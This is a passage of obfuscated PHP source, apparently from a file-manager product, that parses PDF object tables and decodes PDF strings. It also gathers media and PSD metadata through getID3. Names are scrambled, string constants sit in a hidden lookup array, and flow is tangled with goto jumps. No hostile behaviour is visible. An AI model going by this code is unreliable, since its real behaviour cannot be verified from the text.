$dÕ–£¡”©[$D¶èÔÊôğÛ[1539]][$D¶èÔÊôğÛ[1569]] = intval($f¯‹ä Ğ½[1]) . $D¶èÔÊôğÛ[70] . intval($f¯‹ä Ğ½[2]); } goto f…‰äâöäœ; A–çİ¸Ü”©: foreach ($f¯‹ä Ğ½[3] as $bÁŠñÊ¡óÅ => $bÀé´¥½Ù‹) { if ($f¯‹ä Ğ½[3][$bÁŠñÊ¡óÅ] == $D¶èÔÊôğÛ[1561]) { $D¨ÄëÈ…¥ƒ = $CÅë¤¾ÃÙ‡ . $D¶èÔÊôğÛ[70] . intval($f¯‹ä Ğ½[2][$bÁŠñÊ¡óÅ]); $dÕ–£¡”©[$D¶èÔÊôğÛ[1558]][$D¨ÄëÈ…¥ƒ] = intval($f¯‹ä Ğ½[1][$bÁŠñÊ¡óÅ]); ++$CÅë¤¾ÃÙ‡; } else { if ($f¯‹ä Ğ½[3][$bÁŠñÊ¡óÅ] == $D¶èÔÊôğÛ[1562]) { ++$CÅë¤¾ÃÙ‡; } else { } } } if (preg_match_all($D¶èÔÊôğÛ[1563], $B«ïä˜ÛŞ, $f¯‹ä Ğ½)) { $D½²Îö„ƒ¹ = $fø¸°ğ‡œå[$D¶èÔÊôğÛ[77]] - $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1536]]; foreach ($f¯‹ä Ğ½[0] as $bÁŠñÊ¡óÅ => $d–©ŒÃÎĞ‚) { $EÙŒã‰÷¹¤ = $f¯‹ä Ğ½[1][$bÁŠñÊ¡óÅ] . $D¶èÔÊôğÛ[70] . $f¯‹ä Ğ½[2][$bÁŠñÊ¡óÅ]; $dÕ–£¡”©[$D¶èÔÊôğÛ[1558]][$EÙŒã‰÷¹¤] = strpos($B«ïä˜ÛŞ, $d–©ŒÃÎĞ‚) + $D½²Îö„ƒ¹ + 1; } } if (preg_match_all($D¶èÔÊôğÛ[1564], $B«ïä˜ÛŞ, $f¯‹ä Ğ½)) { $a“ØÅ½¨Ì = count($f¯‹ä Ğ½[1]) == 1 ? $f¯‹ä Ğ½[1][0] : $f¯‹ä Ğ½[1][1]; } else { $a“ØÅ½¨Ì = substr($B«ïä˜ÛŞ, -1024 * 5); } goto BÛ¶£ôô‰; CÙçŞÄã•: if (preg_match($D¶èÔÊôğÛ[1572], $a“ØÅ½¨Ì, $f¯‹ä Ğ½) > 0) { } return $dÕ–£¡”©; goto bˆ·ëÓÆØ×; f‡È‡â˜§: $D¶èÔÊôğÛ =& $_SERVER[¦·]; $B«ïä˜ÛŞ = $fø¸°ğ‡œå[$D¶èÔÊôğÛ[1538]]; $dÕ–£¡”© = array($D¶èÔÊôğÛ[1539] => array(), $D¶èÔÊôğÛ[1558] => array()); goto F×åì¼Ã–; bˆ·ëÓÆØ×: } private static function getObjectValue($DîŠ›‚“æ½, $fÓ’ÀÓ§Ê©, $cÑé¶Ú¸‹) { goto f¬ùÒØ¸Í; DŒÜ±ÔŞÙÁ: return $b“®Ëƒ•ì„; goto d‘³ÍŞ¿»‘; f¬ùÒØ¸Í: $Aõ†Æ®ğñŒ =& $_SERVER[¦·]; $c¹ÂÚÎÄ‘ = self::getObject($DîŠ›‚“æ½, $fÓ’ÀÓ§Ê©[$Aõ†Æ®ğñŒ[1558]][$cÑé¶Ú¸‹]); if (is_string($c¹ÂÚÎÄ‘[1])) { return $c¹ÂÚÎÄ‘[1]; } goto Fœ‹ƒÆòÏš; Fœ‹ƒÆòÏš: if (!is_array($c¹ÂÚÎÄ‘[1])) { return array(); } $b“®Ëƒ•ì„ = array(); for ($bì÷ˆ­»ğ = 0; $bì÷ˆ­»ğ < count($c¹ÂÚÎÄ‘[1]); $bì÷ˆ­»ğ += 2) { $e´µŞÀª–Ù = $c¹ÂÚÎÄ‘[1][$bì÷ˆ­»ğ]; $bÇØÒ¤—íÀ = $c¹ÂÚÎÄ‘[1][$bì÷ˆ­»ğ + 1]; if (count($e´µŞÀª–Ù) == 3 && $e´µŞÀª–Ù[0] == $Aõ†Æ®ğñŒ[8]) { $DºÉ‚‘¦ğµ = !1; if ($bÇØÒ¤—íÀ[0] == $Aõ†Æ®ğñŒ[1573]) { $bÇØÒ¤—íÀ = self::getObject($DîŠ›‚“æ½, $fÓ’ÀÓ§Ê©[$Aõ†Æ®ğñŒ[1558]][$bÇØÒ¤—íÀ[1]]); } $DºÉ‚‘¦ğµ = $bÇØÒ¤—íÀ[1]; if ($DºÉ‚‘¦ğµ === !1) { continue; } if (is_string($DºÉ‚‘¦ğµ)) { $DºÉ‚‘¦ğµ = self::decodeStr($DºÉ‚‘¦ğµ); } $b“®Ëƒ•ì„[$e´µŞÀª–Ù[1]] = $DºÉ‚‘¦ğµ; } } goto DŒÜ±ÔŞÙÁ; d‘³ÍŞ¿»‘: } private static function getObject($CŠÔÕ¿–†µ, $b®ñÎ»àĞß) { $a´î‹Ñ‹‚æ = self::getObjectItem($CŠÔÕ¿–†µ, $b®ñÎ»àĞß); $a´î‹Ñ‹‚æ = self::getObjectItem($CŠÔÕ¿–†µ, $a´î‹Ñ‹‚æ[2]); return $a´î‹Ñ‹‚æ; } private static function getObjectItem($eÊóø‚ƒÆĞ, $bŸ±ˆ»²ò†) { goto Fò“”—Ÿ©; Fò“”—Ÿ©: $d—ŠÖŞé‡œ =& $_SERVER[¦·]; $d•‰„Í‘ª­ = $eÊóø‚ƒÆĞ[$d—ŠÖŞé‡œ[1536]]; $FŠ‚ˆİº„™ = $eÊóø‚ƒÆĞ[$d—ŠÖŞé‡œ[77]] - $d•‰„Í‘ª­; goto c¿ÌŸêŸ‹; c¿ÌŸêŸ‹: $cé Áğ«Äª = $bŸ±ˆ»²ò† >= $FŠ‚ˆİº„™ ? $bŸ±ˆ»²ò† - $FŠ‚ˆİº„™ : $bŸ±ˆ»²ò†; $DµÉÇÔÁ² = $bŸ±ˆ»²ò† >= $FŠ‚ˆİº„™ ? $eÊóø‚ƒÆĞ[$d—ŠÖŞé‡œ[1538]] : $eÊóø‚ƒÆĞ[$d—ŠÖŞé‡œ[1537]]; if ($bŸ±ˆ»²ò† > $d•‰„Í‘ª­ && $bŸ±ˆ»²ò† <= $FŠ‚ˆİº„™) { $cé Áğ«Äª = 0; $DµÉÇÔÁ² = StreamWrapperIO::read($eÊóø‚ƒÆĞ[$d—ŠÖŞé‡œ[75]], $bŸ±ˆ»²ò†, $d•‰„Í‘ª­); } goto E÷ Ï­«è—; E÷ Ï­«è—: $EÀ¶œÜ…ƒŒ = self::getRawObject($DµÉÇÔÁ², $cé Áğ«Äª); if ($bŸ±ˆ»²ò† >= $FŠ‚ˆİº„™) { $EÀ¶œÜ…ƒŒ[2] = $EÀ¶œÜ…ƒŒ[2] + $FŠ‚ˆİº„™; } else { if ($bŸ±ˆ»²ò† > $d•‰„Í‘ª­ && $bŸ±ˆ»²ò† <= $FŠ‚ˆİº„™) { $EÀ¶œÜ…ƒŒ[2] = $EÀ¶œÜ…ƒŒ[2] + $bŸ±ˆ»²ò†; } } return $EÀ¶œÜ…ƒŒ; goto DÖ†”æº‘; DÖ†”æº‘: } private static function decodeStr($Eò‚á³«Ü) { goto D§çòÒ¢½Ø; d”Ñ„‚¥÷: return $Eò‚á³«Ü; goto fæ˜£ƒù¾„; díŸòŒ¦…¸: $Eò‚á³«Ü = $e§¨àÄ«ÜÛ[33]; foreach ($c¯‘­Ö£¸ as $C•Ù¢äˆ„ß) { if (preg_match($e§¨àÄ«ÜÛ[1583], $C•Ù¢äˆ„ß)) { $Eò‚á³«Ü .= \chr(octdec(trim($C•Ù¢äˆ„ß, $e§¨àÄ«ÜÛ[93]))); } else { $Eò‚á³«Ü .= $C•Ù¢äˆ„ß; } } $c¯‘­Ö£¸ = preg_split($e§¨àÄ«ÜÛ[1584], $Eò‚á³«Ü, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CôòÛØƒ™°; bÓÓÕ‘Ø¿: $Eò‚á³«Ü = $e§¨àÄ«ÜÛ[33]; foreach ($c¯‘­Ö£¸ as $C•Ù¢äˆ„ß) { if (preg_match($e§¨àÄ«ÜÛ[1588], $C•Ù¢äˆ„ß) && !1 === stripos($C•Ù¢äˆ„ß, $e§¨àÄ«ÜÛ[1589])) { $C•Ù¢äˆ„ß = preg_replace($e§¨àÄ«ÜÛ[1590], $e§¨àÄ«ÜÛ[33], $C•Ù¢äˆ„ß); $C•Ù¢äˆ„ß = trim($C•Ù¢äˆ„ß, $e§¨àÄ«ÜÛ[928]); $C•Ù¢äˆ„ß = pack($e§¨àÄ«ÜÛ[1591], $C•Ù¢äˆ„ß); $Eò‚á³«Ü .= $C•Ù¢äˆ„ß; } else { $Eò‚á³«Ü .= $C•Ù¢äˆ„ß; } } if (preg_match($e§¨àÄ«ÜÛ[1592], $Eò‚á³«Ü)) { $A½êÂ‰„ = substr($Eò‚á³«Ü, 2); $Eò‚á³«Ü = $e§¨àÄ«ÜÛ[33]; $F½‘‚èí¢ò = strlen($A½êÂ‰„); for ($fé£ËÄøãÖ = 0; $fé£ËÄøãÖ < $F½‘‚èí¢ò; $fé£ËÄøãÖ += 2) { $EÕµ…‹µ“ = hexdec(bin2hex(substr($A½êÂ‰„, $fé£ËÄøãÖ, 2))); $Eò‚á³«Ü .= mb_convert_encoding($e§¨àÄ«ÜÛ[1593] . intval($EÕµ…‹µ“) . $e§¨àÄ«ÜÛ[67], $e§¨àÄ«ÜÛ[1594], $e§¨àÄ«ÜÛ[1595]); } } goto d”Ñ„‚¥÷; CôòÛØƒ™°: $Eò‚á³«Ü = $e§¨àÄ«ÜÛ[33]; foreach ($c¯‘­Ö£¸ as $C•Ù¢äˆ„ß) { if (preg_match($e§¨àÄ«ÜÛ[1585], $C•Ù¢äˆ„ß)) { $Eò‚á³«Ü .= \chr(hexdec(trim($C•Ù¢äˆ„ß, $e§¨àÄ«ÜÛ[1586]))); } else { $Eò‚á³«Ü .= $C•Ù¢äˆ„ß; } } $c¯‘­Ö£¸ = preg_split($e§¨àÄ«ÜÛ[1587], $Eò‚á³«Ü, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto bÓÓÕ‘Ø¿; D§çòÒ¢½Ø: $e§¨àÄ«ÜÛ =& $_SERVER[¦·]; $Eò‚á³«Ü = str_replace(array($e§¨àÄ«ÜÛ[1574], $e§¨àÄ«ÜÛ[1575], $e§¨àÄ«ÜÛ[1576], $e§¨àÄ«ÜÛ[1577], $e§¨àÄ«ÜÛ[1578], $e§¨àÄ«ÜÛ[1579], $e§¨àÄ«ÜÛ[1580], $e§¨àÄ«ÜÛ[1581]), array($e§¨àÄ«ÜÛ[93], $e§¨àÄ«ÜÛ[50], $e§¨àÄ«ÜÛ[8], $e§¨àÄ«ÜÛ[248], $e§¨àÄ«ÜÛ[819], $e§¨àÄ«ÜÛ[217], $e§¨àÄ«ÜÛ[995], $e§¨àÄ«ÜÛ[330]), $Eò‚á³«Ü); $c¯‘­Ö£¸ = preg_split($e§¨àÄ«ÜÛ[1582], $Eò‚á³«Ü, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto díŸòŒ¦…¸; fæ˜£ƒù¾„: } private static function getRawObject($Cß”Òê÷º›, $FæŞÁ¡Œ“‚ = 0) { goto E„¸Ÿäğª; dŠÌœ¸‘ëğ: $FæŞÁ¡Œ“‚ += strspn($Cß”Òê÷º›, $F¨”ï®¡Å[1596], $FæŞÁ¡Œ“‚); $f¦‡†ª˜‚Ô = $Cß”Òê÷º›[$FæŞÁ¡Œ“‚]; switch ($f¦‡†ª˜‚Ô) { case $F¨”ï®¡Å[1597]: $dÓÒÀ†Í°Ô = strcspn($Cß”Òê÷º›, $F¨”ï®¡Å[1598], $FæŞÁ¡Œ“‚); if ($dÓÒÀ†Í°Ô > 0) { $FæŞÁ¡Œ“‚ += $dÓÒÀ†Í°Ô; return self::getRawObject($Cß”Òê÷º›, $FæŞÁ¡Œ“‚); } break; case $F¨”ï®¡Å[8]: $DÍÔ’ÄŞğ¾ = $f¦‡†ª˜‚Ô; ++$FæŞÁ¡Œ“‚; $E§ÜàŒ¯„Ì = preg_match($F¨”ï®¡Å[1599], substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 256), $cÜºîöĞ¾é); if (1 == $E§ÜàŒ¯„Ì) { $dñÙàØïë = $cÜºîöĞ¾é[1]; $FæŞÁ¡Œ“‚ += strlen($dñÙàØïë); } break; case $F¨”ï®¡Å[248]: case $F¨”ï®¡Å[819]: $DÍÔ’ÄŞğ¾ = $f¦‡†ª˜‚Ô; ++$FæŞÁ¡Œ“‚; $FÂùÊŞÅØ = $FæŞÁ¡Œ“‚; if ($F¨”ï®¡Å[248] == $f¦‡†ª˜‚Ô) { $c‰¤¢Š«ªœ = 1; while ($c‰¤¢Š«ªœ > 0) { if (!isset($Cß”Òê÷º›[$FÂùÊŞÅØ])) { break; } $fíôÊµöŒİ = $Cß”Òê÷º›[$FÂùÊŞÅØ]; switch ($fíôÊµöŒİ) { case $F¨”ï®¡Å[93]: ++$FÂùÊŞÅØ; break; case $F¨”ï®¡Å[248]: ++$c‰¤¢Š«ªœ; break; case $F¨”ï®¡Å[819]: --$c‰¤¢Š«ªœ; break; } ++$FÂùÊŞÅØ; } $dñÙàØïë = substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, $FÂùÊŞÅØ - $FæŞÁ¡Œ“‚ - 1); $FæŞÁ¡Œ“‚ = $FÂùÊŞÅØ; } break; case $F¨”ï®¡Å[157]: case $F¨”ï®¡Å[478]: $DÍÔ’ÄŞğ¾ = $f¦‡†ª˜‚Ô; ++$FæŞÁ¡Œ“‚; if ($F¨”ï®¡Å[157] == $f¦‡†ª˜‚Ô) { $dñÙàØïë = array(); do { $eõ¢àöÉùë = $FæŞÁ¡Œ“‚; $DäŠ‚Ë”À¡ = self::getRawObject($Cß”Òê÷º›, $FæŞÁ¡Œ“‚); $FæŞÁ¡Œ“‚ = $DäŠ‚Ë”À¡[2]; $dñÙàØïë[] = $DäŠ‚Ë”À¡; } while ($F¨”ï®¡Å[478] != $DäŠ‚Ë”À¡[0] && $FæŞÁ¡Œ“‚ != $eõ¢àöÉùë); array_pop($dñÙàØïë); } break; case $F¨”ï®¡Å[927]: case $F¨”ï®¡Å[930]: if (isset($Cß”Òê÷º›[$FæŞÁ¡Œ“‚ + 1]) && $Cß”Òê÷º›[$FæŞÁ¡Œ“‚ + 1] == $f¦‡†ª˜‚Ô) { $DÍÔ’ÄŞğ¾ = $f¦‡†ª˜‚Ô . $f¦‡†ª˜‚Ô; $FæŞÁ¡Œ“‚ += 2; if ($F¨”ï®¡Å[927] == $f¦‡†ª˜‚Ô) { $dñÙàØïë = array(); do { $eõ¢àöÉùë = $FæŞÁ¡Œ“‚; $DäŠ‚Ë”À¡ = self::getRawObject($Cß”Òê÷º›, $FæŞÁ¡Œ“‚); $FæŞÁ¡Œ“‚ = $DäŠ‚Ë”À¡[2]; $dñÙàØïë[] = $DäŠ‚Ë”À¡; } while ($F¨”ï®¡Å[1600] != $DäŠ‚Ë”À¡[0] && $FæŞÁ¡Œ“‚ != $eõ¢àöÉùë); array_pop($dñÙàØïë); } } else { $DÍÔ’ÄŞğ¾ = $f¦‡†ª˜‚Ô; ++$FæŞÁ¡Œ“‚; $E§ÜàŒ¯„Ì = preg_match($F¨”ï®¡Å[1601], substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚), $cÜºîöĞ¾é); if ($F¨”ï®¡Å[927] == $f¦‡†ª˜‚Ô && 1 == $E§ÜàŒ¯„Ì) { $dñÙàØïë = strtr($cÜºîöĞ¾é[1], $F¨”ï®¡Å[1602], $F¨”ï®¡Å[33]); $FæŞÁ¡Œ“‚ += \strlen($cÜºîöĞ¾é[0]); } elseif (!1 !== ($C­îß“­‡± = strpos($Cß”Òê÷º›, $F¨”ï®¡Å[930], $FæŞÁ¡Œ“‚))) { $FæŞÁ¡Œ“‚ = $C­îß“­‡± + 1; } } break; default: if ($F¨”ï®¡Å[1603] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 6)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1603]; $FæŞÁ¡Œ“‚ += 6; } elseif ($F¨”ï®¡Å[99] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 4)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[99]; $FæŞÁ¡Œ“‚ += 4; $dñÙàØïë = $F¨”ï®¡Å[99]; } elseif ($F¨”ï®¡Å[1604] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 4)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1605]; $FæŞÁ¡Œ“‚ += 4; $dñÙàØïë = $F¨”ï®¡Å[1604]; } elseif ($F¨”ï®¡Å[1606] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 5)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1605]; $FæŞÁ¡Œ“‚ += 5; $dñÙàØïë = $F¨”ï®¡Å[1606]; } elseif ($F¨”ï®¡Å[1607] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 6)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1607]; $FæŞÁ¡Œ“‚ += 6; if (1 == preg_match($F¨”ï®¡Å[1608], substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚), $cÜºîöĞ¾é)) { $FæŞÁ¡Œ“‚ += strlen($cÜºîöĞ¾é[0]); $FÄçËçÔ£ë = $F¨”ï®¡Å[1609]; $E§ÜàŒ¯„Ì = preg_match($FÄçËçÔ£ë, substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚), $cÜºîöĞ¾é, PREG_OFFSET_CAPTURE); if (1 == $E§ÜàŒ¯„Ì) { $dñÙàØïë = substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, $cÜºîöĞ¾é[0][1]); $FæŞÁ¡Œ“‚ += $cÜºîöĞ¾é[1][1]; } } } elseif ($F¨”ï®¡Å[1610] == substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 9)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1610]; $FæŞÁ¡Œ“‚ += 9; } elseif (1 == preg_match($F¨”ï®¡Å[1611], substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 33), $cÜºîöĞ¾é)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1573]; $FæŞÁ¡Œ“‚ += strlen($cÜºîöĞ¾é[0]); $dñÙàØïë = intval($cÜºîöĞ¾é[1]) . $F¨”ï®¡Å[70] . intval($cÜºîöĞ¾é[2]); } elseif (1 == preg_match($F¨”ï®¡Å[1612], substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, 33), $cÜºîöĞ¾é)) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1613]; $dñÙàØïë = intval($cÜºîöĞ¾é[1]) . $F¨”ï®¡Å[70] . intval($cÜºîöĞ¾é[2]); $FæŞÁ¡Œ“‚ += strlen($cÜºîöĞ¾é[0]); } elseif (($f§ßÛŸ¶ß³ = strspn($Cß”Òê÷º›, $F¨”ï®¡Å[1614], $FæŞÁ¡Œ“‚)) > 0) { $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[1615]; $dñÙàØïë = substr($Cß”Òê÷º›, $FæŞÁ¡Œ“‚, $f§ßÛŸ¶ß³); $FæŞÁ¡Œ“‚ += $f§ßÛŸ¶ß³; } break; } goto F¸ óŸ¡ôˆ; E„¸Ÿäğª: $F¨”ï®¡Å =& $_SERVER[¦·]; $DÍÔ’ÄŞğ¾ = $F¨”ï®¡Å[33]; $dñÙàØïë = $F¨”ï®¡Å[33]; goto dŠÌœ¸‘ëğ; F¸ óŸ¡ôˆ: return array($DÍÔ’ÄŞğ¾, $dñÙàØïë, $FæŞÁ¡Œ“‚); goto eŠ‘¤†§Ş; eŠ‘¤†§Ş: } } class GetInfo { private static $fileTypeArray; public static function get($B–‘…Ç¶ƒ) { $e³†Ú®¢©Õ = IO::info($B–‘…Ç¶ƒ); return self::infoAdd($e³†Ú®¢©Õ); } public static function check() { } public static function infoAdd(&$B Šéˆ„°) { goto fé÷Ä««¦; E•À µî˜‚: $c–ê¨´¸ÙË = self::arrayValueLimit($c–ê¨´¸ÙË); $c–ê¨´¸ÙË[$C‰¤†¿ˆğ[372]] = $B¦ÁßÃÀÛŠ; $B Šéˆ„°[$C‰¤†¿ˆğ[426]] = $c–ê¨´¸ÙË; goto f¹°É·íÎ; fé÷Ä««¦: $C‰¤†¿ˆğ =& $_SERVER[¦·]; static $aÖ––Š…µ; if (!$aÖ––Š…µ) { require SDK_DIR . $C‰¤†¿ˆğ[1616]; $aÖ––Š…µ = new getID3(); } goto cÜÈÍê¿À; cÜÈÍê¿À: if (!$B Šéˆ„° || $B Šéˆ„°[$C‰¤†¿ˆğ[29]] != $C‰¤†¿ˆğ[167]) { return; } if (!self::support($B Šéˆ„°[$C‰¤†¿ˆğ[160]]) || isset($B Šéˆ„°[$C‰¤†¿ˆğ[426]])) { return; } $eâä÷ˆù = $C‰¤†¿ˆğ[1617] . $B Šéˆ„°[$C‰¤†¿ˆğ[75]]; goto A³Ù„‚ÈÈ; A³Ù„‚ÈÈ: $B¦ÁßÃÀÛŠ = $B Šéˆ„°[$C‰¤†¿ˆğ[160]]; try { if ($B Šéˆ„°[$C‰¤†¿ˆğ[160]] == $C‰¤†¿ˆğ[1618]) { $c–ê¨´¸ÙË = self::psdParse($eâä÷ˆù); $B¦ÁßÃÀÛŠ = $C‰¤†¿ˆğ[1619]; } else { if ($B Šéˆ„°[$C‰¤†¿ˆğ[160]] == $C‰¤†¿ˆğ[1620]) { $c–ê¨´¸ÙË = self::pdfParse($eâä÷ˆù); } else { $B¦ÁßÃÀÛŠ = self::$fileTypeArray[$C‰¤†¿ˆğ[1621]][$B Šéˆ„°[$C‰¤†¿ˆğ[160]]]; $Aóñ«º¶ = self::$fileTypeArray[$C‰¤†¿ˆğ[1622]][$B¦ÁßÃÀÛŠ][$C‰¤†¿ˆğ[1623]]; $CÅ’¸‰¬ôÅ = @$aÖ––Š…µ->analyze($eâä÷ˆù, $B Šéˆ„°[$C‰¤†¿ˆğ[77]], $B Šéˆ„°[$C‰¤†¿ˆğ[28]]); $c–ê¨´¸ÙË = self::parseData($CÅ’¸‰¬ôÅ, $Aóñ«º¶, $B Šéˆ„°); } } } catch (Exception $eˆ¾õ·Ê) { $c–ê¨´¸ÙË = array($C‰¤†¿ˆğ[372] => $B¦ÁßÃÀÛŠ); } if (!$c–ê¨´¸ÙË) { return; } goto E•À µî˜‚; f¹°É·íÎ: return $B Šéˆ„°; goto D‚ù¸ù ù«; D‚ù¸ù ù«: } public static function support($cÕŒ¢¾„) { goto bíÓÂ¸½–; DÖ¤—ƒÃší: $A’©×ˆ·Ñ = array($E‚øØ©œ‚[1620], $E‚øØ©œ‚[1618]); if (in_array($cÕŒ¢¾„, $A’©×ˆ·Ñ)) { return !0; } if (isset(self::$fileTypeArray[$E‚øØ©œ‚[1621]][$cÕŒ¢¾„])) { return !0; } goto b¹¾Û›Ó¿±; bíÓÂ¸½–: $E‚øØ©œ‚ =& $_SERVER[¦·]; if (!self::$fileTypeArray) { self::$fileTypeArray = self::fileTypeParse(); } $cÕŒ¢¾„ = strtolower($cÕŒ¢¾„); goto DÖ¤—ƒÃší; b¹¾Û›Ó¿±: return !1; goto bÓíÂï–°ˆ; bÓíÂï–°ˆ: } public static function arrayValueLimit($Bøî’ÎöÔÃ, $Eë¿âåˆˆã = 5000) { if (!is_array($Bøî’ÎöÔÃ)) { return $Bøî’ÎöÔÃ; } foreach ($Bøî’ÎöÔÃ as $dßç­²Õá‡ => $CÚ‘Î’¹Œ†) { if (is_string($CÚ‘Î’¹Œ†) && strlen($CÚ‘Î’¹Œ†) > $Eë¿âåˆˆã) { $Bøî’ÎöÔÃ[$dßç­²Õá‡] = substr($CÚ‘Î’¹Œ†, 0, $Eë¿âåˆˆã); } else { if (is_array($CÚ‘Î’¹Œ†)) { $Bøî’ÎöÔÃ[$dßç­²Õá‡] = self::arrayValueLimit($CÚ‘Î’¹Œ†, $Eë¿âåˆˆã); } } } return $Bøî’ÎöÔÃ; } private static function parseData($a“¸Š‰øİñ, $cÄ‹ŸÈ®¡¾, $e¹êöÒÕ²®) { $C› ‡¤ÑÒ =& $_SERVER[¦·]; $fÃËªù²Èá = $a“¸Š‰øİñ[$C› ‡¤ÑÒ[1624]]; $bÖõÒ‡›‹ã = array(); foreach ($cÄ‹ŸÈ®¡¾ as $AÌ‚ÄÇ· => $EÓ±ØÒ‰–…) { foreach ($EÓ±ØÒ‰–… as $BäÕŠÍÁ¦ˆ) { if (is_array($BäÕŠÍÁ¦ˆ)) { $A¯‘ŠïÒÉÓ = self::parseData($a“¸Š‰øİñ, $EÓ±ØÒ‰–…, $e¹êöÒÕ²®); if ($A¯‘ŠïÒÉÓ) { $bÖõÒ‡›‹ã[$AÌ‚ÄÇ·] = $A¯‘ŠïÒÉÓ; } break; } $eÜÉá†ºÆ¦ = str_replace($C› ‡¤ÑÒ[1394], $fÃËªù²Èá, $BäÕŠÍÁ¦ˆ); $A¯‘ŠïÒÉÓ = _get($a“¸Š‰øİñ, $eÜÉá†ºÆ¦); $A¯‘ŠïÒÉÓ = is_array($A¯‘ŠïÒÉÓ) ? $A¯‘ŠïÒÉÓ[0] : $A¯‘ŠïÒÉÓ; if ($A¯‘ŠïÒÉÓ) { break; } } if ($A¯‘ŠïÒÉÓ || $A¯‘ŠïÒÉÓ === 0 || $A¯‘ŠïÒÉÓ === !1) { $A¯‘ŠïÒÉÓ = self::valueReset($BäÕŠÍÁ¦ˆ, $A¯‘ŠïÒÉÓ, $AÌ‚ÄÇ·); if ($A¯‘ŠïÒÉÓ !== null) { $bÖõÒ‡›‹ã[$AÌ‚ÄÇ·] = $A¯‘ŠïÒÉÓ; } } } $bÖõÒ‡›‹ã = self::valueResetAll($bÖõÒ‡›‹ã, $e¹êöÒÕ²®); return $bÖõÒ‡›‹ã; } private static function psdParse($CŒš´Áöä‡) { $dİ…÷°ŒÊ× =& $_SERVER[¦·]; if (IO::fileSubstr($CŒš´Áöä‡, 0, 4) != $dİ…÷°ŒÊ×[1625]) { return !1; } $Eò™¡ôä¶‡ = getImageSize($CŒš´Áöä‡, $EøÒ‘»Óˆ„); if (!$Eò™¡ôä¶‡) { return; } $b¿§§¿‡¬… = array($dİ…÷°ŒÊ×[1540] => $Eò™¡ôä¶‡[0], $dİ…÷°ŒÊ×[1542] => $Eò™¡ôä¶‡[1]); return $b¿§§¿‡¬…; } private static function pdfParse($c½¾˜¯“) { return FileParsePdf::parse($c½¾˜¯“); } private static function fileTypeParse() { $e¸ã«±×¡Ø =& $_SERVER[¦·]; $E ‹ˆâ¡Æ£ = self::fileTypeArray(); $C­‹Ä¿çÈ = array(); foreach ($E ‹ˆâ¡Æ£ as $e…ºĞè¾¹¬ => $BÌ††È­Î) { $aˆ»†Ë »Õ = _get($BÌ††È­Î, $e¸ã«±×¡Ø[160], $e¸ã«±×¡Ø[33]); $BÙÌğ“ôóØ = is_string($aˆ»†Ë »Õ) ? explode($e¸ã«±×¡Ø[47], $aˆ»†Ë »Õ) : $aˆ»†Ë »Õ; if (!$BÙÌğ“ôóØ) { continue; } foreach ($BÙÌğ“ôóØ as $aˆ»†Ë »Õ) { $aˆ»†Ë »Õ = strtolower(trim($aˆ»†Ë »Õ)); if (!$aˆ»†Ë »Õ) { continue; } $C­‹Ä¿çÈ[$aˆ»†Ë »Õ] = $e…ºĞè¾¹¬; } $E ‹ˆâ¡Æ£[$e…ºĞè¾¹¬][$e¸ã«±×¡Ø[160]] = array_keys($C­‹Ä¿çÈ); $E ‹ˆâ¡Æ£[$e…ºĞè¾¹¬][$e¸ã«±×¡Ø[1623]] = self::parseKeyMap($BÌ††È­Î[$e¸ã«±×¡Ø[1623]]); } return array($e¸ã«±×¡Ø[1622] => $E ‹ˆâ¡Æ£, $e¸ã«±×¡Ø[1621] => $C­‹Ä¿çÈ); } private static function parseKeyMap($e¼µîë†¶Ú) { $EÈéàùí³ï =& $_SERVER[¦·]; foreach ($e¼µîë†¶Ú as $cø‚ŠôÚÛ« => $c³ˆ‘–©‹‘) { if (is_array($c³ˆ‘–©‹‘)) { $a‰¦ù„Ê† = self::parseKeyMap($c³ˆ‘–©‹‘); if ($a‰¦ù„Ê†) { $e¼µîë†¶Ú[$cø‚ŠôÚÛ«] = $a‰¦ù„Ê†; } continue; } $e¢Ìèô–Æ´ = explode($EÈéàùí³ï[47], $c³ˆ‘–©‹‘); $bÕŸÄˆ•¡¸ = array(); foreach ($e¢Ìèô–Æ´ as $fàÇ†Ûõ—) { $fàÇ†Ûõ— = trim($fàÇ†Ûõ—); if (!$fàÇ†Ûõ—) { continue; } if (preg_match($EÈéàùí³ï[1626], $fàÇ†Ûõ—, $D©ãø‚¡Ä˜)) { $CÃé —Âå˜ = explode($EÈéàùí³ï[271], $D©ãø‚¡Ä˜[1]); foreach ($CÃé —Âå˜ as $C‹»ö«¿Â») { $bÕŸÄˆ•¡¸[] = str_replace($D©ãø‚¡Ä˜[0], $C‹»ö«¿Â», $fàÇ†Ûõ—); } } else { $bÕŸÄˆ•¡¸[] = $fàÇ†Ûõ—; } } $e¼µîë†¶Ú[$cø‚ŠôÚÛ«] = $bÕŸÄˆ•¡¸; } return $e¼µîë†¶Ú; } private static function valueResetAll($A–ä‚ËŠ¦Ö, $Fâµ·µ¤²) { goto C°ôÚ×éˆ; C‘óÂ¡¿—´: if ($d×ñÛ½›Ïñ) { 